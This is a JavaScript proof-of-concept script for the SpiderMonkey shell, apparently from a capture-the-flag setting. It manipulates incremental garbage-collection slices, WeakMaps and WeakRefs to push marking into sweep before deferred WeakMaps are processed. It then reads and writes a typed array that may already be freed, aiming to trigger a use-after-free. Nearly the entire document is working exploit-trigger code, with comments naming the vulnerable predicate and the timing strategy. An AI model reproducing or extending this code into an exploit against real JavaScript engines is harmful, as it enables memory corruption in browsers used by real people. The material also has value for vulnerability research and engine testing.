"use strict";

const mode = scriptArgs.length ? scriptArgs[0] : "probe";

function out(...xs) {
  print(xs.map(String).join(" "));
}

function safeJSON(v) {
  try {
    return JSON.stringify(v);
  } catch (e) {
    return `<json-error:${e}>`;
  }
}

function setParam(name, value) {
  try {
    const old = gcparam(name);
    gcparam(name, value);
    out(`gcparam ${name}: ${old} -> ${gcparam(name)}`);
    return true;
  } catch (e) {
    out(`gcparam ${name} unavailable: ${e}`);
    return false;
  }
}

function configureSerialIncrementalGC() {
  if (typeof gczeal === "function") {
    gczeal(0);
  }
  setParam("parallelMarkingEnabled", 0);
  setParam("concurrentMarkingEnabled", 0);
  setParam("incrementalGCEnabled", 1);
}

function gcInfo(tag) {
  let info = {};
  try {
    info = currentgc();
  } catch (e) {
    info = {error: String(e)};
  }
  out(`${tag}: state=${typeof gcstate === "function" ? gcstate() : "n/a"} info=${safeJSON(info)}`);
  return info;
}

function buildFiller(count) {
  const roots = new Array(count);
  for (let i = 0; i < count; i++) {
    roots[i] = {
      a: {i, p: i ^ 0x55aa},
      b: [i, i + 1, i + 2, {q: i * 3}],
      c: `filler-${i}`,
    };
  }
  globalThis.__ctfFiller = roots;
  return roots;
}

function makePayload(seed) {
  const v = new Uint8Array(0x10000);
  for (let i = 0; i < 64; i++) {
    v[i] = (seed + i * 13) & 0xff;
  }
  v.seed = seed;
  v.tag = `weakmap-value-${seed}`;
  return v;
}

function makeWeakCandidate(seed) {
  let key = {seed, keyTag: `key-${seed}`};
  let map = new WeakMap();
  let value = makePayload(seed);
  map.set(key, value);
  const mapRef = new WeakRef(map);
  const keyRef = new WeakRef(key);
  return {mapRef, keyRef};
}

function makeCandidates(count) {
  const refs = new Array(count);
  for (let i = 0; i < count; i++) {
    refs[i] = makeWeakCandidate(0x40 + i);
  }
  if (typeof minorgc === "function") {
    minorgc();
  }
  return refs;
}

function derefCandidate(ref, index) {
  const m = ref.mapRef.deref();
  const k = ref.keyRef.deref();
  if (m === undefined || k === undefined) {
    out(`candidate ${index}: target already unavailable m=${m} k=${k}`);
    return null;
  }
  return {m, k, index};
}

function touchPair(pair, label) {
  out(`touch ${label}: candidate=${pair.index}`);
  const value = pair.m.get(pair.k);
  out(`touch ${label}: map.get type=${typeof value} value=${String(value)}`);
  if (value === undefined) {
    out(`touch ${label}: weak entry missing`);
    return false;
  }

  // A reclaimed typed-array object or its backing store should fault under ASan.
  let sum = 0;
  for (let i = 0; i < 64; i++) {
    sum = (sum + value[i]) | 0;
  }
  out(`touch ${label}: length=${value.length} byteLength=${value.byteLength} sum=${sum} seed=${value.seed} tag=${value.tag}`);
  value[0] ^= 0xff;
  value.fill(0x5a, 1, 0x100);
  const copy = value.slice(0, 0x200);
  out(`touch ${label}: post-write=${value[0]} copy=${copy.length}`);
  return true;
}

function finishSweepAfterZeroBudget() {
  // The first zero-budget slice moves Mark -> Sweep through the broken
  // completion predicate. A few additional zero-budget slices advance past the
  // mark-during-sweeping action without giving deferred maps a positive budget.
  for (let i = 0; i < 12 && gcstate() !== "NotActive"; i++) {
    gcInfo(`zero-sweep-before-${i}`);
    gcslice(0, {dontStart: true});
    gcInfo(`zero-sweep-after-${i}`);
  }

  // Once past the sweep-group marking action, finish finalization normally.
  for (let i = 0; i < 10000 && gcstate() !== "NotActive"; i++) {
    gcslice(10000, {dontStart: true});
    if ((i & 31) === 0) {
      gcInfo(`finish-sweep-${i}`);
    }
  }
  gcInfo("finish-sweep-done");
}

function runProbe() {
  out(`mode=${mode}`);
  try {
    out(`build=${safeJSON(getBuildConfiguration())}`);
  } catch (e) {
    out(`getBuildConfiguration failed: ${e}`);
  }
  for (const name of [
    "gc", "minorgc", "gczeal", "gcparam", "startgc", "gcslice",
    "finishgc", "gcstate", "currentgc", "selectforgc", "enqueueMark",
    "clearMarkQueue", "addMarkObservers", "getMarks", "clearKeptObjects",
    "nondeterministicGetWeakMapKeys", "schedulezone",
  ]) {
    out(`${name}: ${typeof globalThis[name]}`);
  }
  for (const name of [
    "parallelMarkingEnabled", "concurrentMarkingEnabled",
    "incrementalGCEnabled", "compactingEnabled",
  ]) {
    try {
      out(`gcparam ${name}=${gcparam(name)}`);
    } catch (e) {
      out(`gcparam ${name}: ${e}`);
    }
  }
  gcInfo("probe");
}

function runQueue() {
  configureSerialIncrementalGC();
  buildFiller(120000);

  let key = {queueKey: 0x1337};
  let map = new WeakMap();
  let value = makePayload(0x71);
  map.set(key, value);
  const mapRef = new WeakRef(map);
  const keyRef = new WeakRef(key);

  if (typeof minorgc === "function") {
    minorgc();
  }

  enqueueMark("drain");
  enqueueMark(key);
  enqueueMark(map);
  enqueueMark("yield");

  key = null;
  map = null;
  value = null;
  clearKeptObjects();

  schedulezone(globalThis);
  gcInfo("queue-before-start");
  startgc(1);
  gcInfo("queue-after-start");

  // If root preparation consumed the first slice, continue with a tiny budget.
  for (let i = 0; i < 100 && (gcstate() === "Prepare" || gcstate() === "MarkRoots"); i++) {
    gcslice(1, {dontStart: true});
    gcInfo(`queue-root-${i}`);
  }

  finishSweepAfterZeroBudget();

  const m = mapRef.deref();
  const k = keyRef.deref();
  out(`queue recovered m=${m} k=${k}`);
  if (m !== undefined && k !== undefined) {
    touchPair({m, k, index: 0x71}, "queue");
  }
}

function runWeakRef(useSelect) {
  configureSerialIncrementalGC();
  buildFiller(180000);
  const refs = makeCandidates(512);
  clearKeptObjects();

  // Limit the collection to the current zone so the critical deferred map is
  // not rescued by a later sweep group.
  schedulezone(globalThis);
  startgc(1);
  gcInfo("weakref-after-start");

  for (let i = 0; i < 1000 && (gcstate() === "Prepare" || gcstate() === "MarkRoots"); i++) {
    gcslice(1000, {dontStart: true});
  }
  gcInfo("weakref-after-roots");

  const live = [];
  let critical = null;
  let next = 0;

  for (let round = 0; round < 20000 && gcstate() === "Mark"; round++) {
    // Make progress through ordinary marking first.
    gcslice(250, {dontStart: true});
    if (gcstate() !== "Mark") {
      break;
    }

    if (next >= refs.length) {
      out("ran out of candidates");
      break;
    }

    const pair = derefCandidate(refs[next], next);
    next++;
    if (!pair) {
      continue;
    }

    // Holding the map/key makes them live. WeakRef.deref's read barrier marks
    // them; marking the WeakMap places it on the deferred list. selectforgc is
    // additionally exercised in the select mode.
    live.push(pair);
    if (useSelect && typeof selectforgc === "function") {
      selectforgc(pair.k, pair.m);
    }

    gcInfo(`injected-${pair.index}`);

    // With serial marking and a zero work budget, markSynchronously reports
    // NotFinished without draining deferred WeakMaps. The vulnerable
    // hasMarkingWork() then sees no ordinary stack work and may advance to Sweep.
    gcslice(0, {dontStart: true});
    gcInfo(`post-zero-${pair.index}`);

    if (gcstate() !== "Mark") {
      critical = pair;
      out(`critical candidate=${pair.index} state=${gcstate()}`);
      break;
    }
  }

  if (!critical) {
    out(`no critical transition; state=${gcstate()} candidates=${next}`);
    return;
  }

  finishSweepAfterZeroBudget();

  // Touch the most likely stale entry first, then all live candidates.
  touchPair(critical, "critical");
  for (let i = live.length - 1; i >= 0; i--) {
    if (live[i] !== critical) {
      touchPair(live[i], `live-${i}`);
    }
  }
}

function runNatural() {
  configureSerialIncrementalGC();
  buildFiller(220000);

  // Repeat the weak-reference scheduling strategy with larger slices and more
  // candidates to cover timing differences in optimized shells.
  const refs = makeCandidates(2048);
  clearKeptObjects();
  schedulezone(globalThis);
  startgc(1);

  while (gcstate() === "Prepare" || gcstate() === "MarkRoots") {
    gcslice(5000, {dontStart: true});
  }

  const live = [];
  let critical = null;
  for (let i = 0; i < refs.length && gcstate() === "Mark"; i++) {
    gcslice(5000, {dontStart: true});
    if (gcstate() !== "Mark") {
      break;
    }
    const pair = derefCandidate(refs[i], i);
    if (!pair) {
      continue;
    }
    live.push(pair);
    gcslice(0, {dontStart: true});
    if (gcstate() !== "Mark") {
      critical = pair;
      break;
    }
  }

  out(`natural critical=${critical && critical.index} state=${gcstate()}`);
  if (!critical) {
    return;
  }
  finishSweepAfterZeroBudget();
  touchPair(critical, "natural-critical");
}

out(`BEGIN mode=${mode}`);
try {
  switch (mode) {
    case "probe":
      runProbe();
      break;
    case "queue":
      runQueue();
      break;
    case "select":
      runWeakRef(true);
      break;
    case "weakref":
      runWeakRef(false);
      break;
    case "natural":
      runNatural();
      break;
    default:
      throw new Error(`unknown mode ${mode}`);
  }
} catch (e) {
  out(`TOP-LEVEL-ERROR: ${e}`);
  if (e && e.stack) {
    out(e.stack);
  }
  throw e;
}
out(`END mode=${mode}`);
